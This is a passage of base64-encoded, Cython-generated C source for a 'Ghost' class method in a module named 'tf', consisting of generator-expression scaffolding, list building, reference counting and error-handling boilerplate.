QogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgICB9IGVsc2UgewogICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzMoX19weXhfdF8xKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSB7CiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTsKICAgICAgICBpZiAoZXhjX3R5cGUpIHsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzQpOwogICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpIH0KICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzd9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgfQogICAgaWYgKHVubGlrZWx5KF9fUHl4X0xpc3RDb21wX0FwcGVuZChfX3B5eF9yLCAoUHlPYmplY3QqKV9fcHl4X3RfNCkpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHsKICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7CiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgI2VuZGlmCiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTsKICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzVnZW5lcmF0b3IxKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzN0bGxfM2dlbmV4cHIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopUHlfTm9uZSk7CiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgICBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogIH0gZWxzZSB7CiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICB9CiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKSBfX3B5eF9zZWxmOwogIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTsKICBfX1B5eF9HSVZFUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUpOwogIF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCA9IF9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzVnZW5lcmF0b3IxLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X3RsbF9sb2NhbHNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmKTsgaWYgKHVubGlrZWx5KCFnZW4pKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QudGxsLmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfNWdlbmVyYXRvcjEoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeU9iamVjdCAqKCpfX3B5eF90XzMpKFB5T2JqZWN0ICopOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90Xzg7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkgewogICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjsKICAgIGRlZmF1bHQ6IAogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gTlVMTDsKICB9CiAgX19weXhfTDNfZmlyc3RfcnVuOjsKICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9yKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MMV9lcnJvcikgfQogIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsKICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMDsgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF8zID0gTlVMTDsKICB9IGVsc2UgewogICAgX19weXhfdF8yID0gLTE7IF9fcHl4X3RfMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpCiAgfQogIGZvciAoOzspIHsKICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHsKICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEpKSkgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgewogICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpCiAgICB9IGVsc2UgewogICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzMoX19weXhfdF8xKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSB7CiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTsKICAgICAgICBpZiAoZXhjX3R5cGUpIHsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzQpOwogICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpIH0KICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzd9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgfQogICAgaWYgKHVubGlrZWx5KF9fUHl4X0xpc3RDb21wX0FwcGVuZChfX3B5eF9yLCAoUHlPYmplY3QqKV9fcHl4X3RfNCkpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHsKICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7CiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgI2VuZGlmCiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTsKICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzhnZW5lcmF0b3IyKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzN0bGxfNmdlbmV4cHIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICopUHlfTm9uZSk7CiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgICBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogIH0gZWxzZSB7CiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICB9CiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKSBfX3B5eF9zZWxmOwogIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTsKICBfX1B5eF9HSVZFUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUpOwogIF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCA9IF9fc